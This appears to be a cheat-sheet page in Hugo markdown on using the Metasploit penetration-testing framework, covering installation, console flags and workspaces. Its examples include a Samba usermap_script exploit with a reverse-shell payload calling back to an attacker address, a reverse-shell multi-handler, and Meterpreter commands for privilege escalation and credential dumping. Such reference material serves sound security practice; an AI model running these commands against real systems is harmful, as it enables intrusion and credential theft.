---
### The title for the content.
title : "Metasploit"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "metasploit"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description : "The world’s most used penetration testing framework"
### The datetime assigned to this page.
date : 2020-03-10T16:33:38+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "metasploit"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight : 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
### a map of Front Matter keys whose values are passed down to the page’s descendants unless overwritten by self or a closer ancestor’s cascade. 
cascade:
    tags: ['Metasploit']
---

## Metasploit

### Install

Easiest way is to use Kali/Parrot and install from repo

```bash
apt install metasploit-framework
```

otherwise download from 

```bash
https://github.com/rapid7/metasploit-framework/releases
```

### Usage

```bash
msfconsole [options]
```

### Flags

```bash
Common options:
    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

Database options:
    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
    -n, --no-database                Disable database support
    -y, --yaml PATH                  Specify a YAML file containing database settings

Framework options:
    -c FILE                          Load the specified configuration file
    -v, -V, --version                Show version

Module options:
        --defer-module-loads         Defer module loading unless explicitly asked.
    -m, --module-path DIRECTORY      Load an additional module path

Console options:
    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
    -H, --history-file FILE          Save command history to the specified file
    -L, --real-readline              Use the system Readline library instead of RbReadline
    -o, --output FILE                Output to the specified file
    -p, --plugin PLUGIN              Load a plugin on startup
    -q, --quiet                      Do not print the banner on startup
    -r, --resource FILE              Execute the specified resource file (- for stdin)
    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
    -h, --help                       Show this message
```

### Examples

#### init database

```bash
msfdb init
```

#### create new workspace

```bash
workspace -a [name]
```

#### switch to workspace

```bash
workspace [name]
```

#### run commands without interactive shell

```bash
msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 172.16.194.172;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 172.16.194.163;\
run"
```

#### Multi-handler for reverse shell

To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <IP>
set lport <PORT>
set ExitOnSession false
exploit -j
```

The -j option is to keep all the connected session in the background.  

##### netcat/bash reverse

```bash
set PAYLOAD linux/x86/shell/reverse_tcp
```

##### run in the background

```bash
run -j
```

#### Meterpreter

`getsystem`

`hashdump`

`load kiwi`

`creds_all`

### Also see

* [Github Project](https://github.com/rapid7/metasploit-framework)
* [metasploit-unleashed](https://www.offensive-security.com/metasploit-unleashed/)
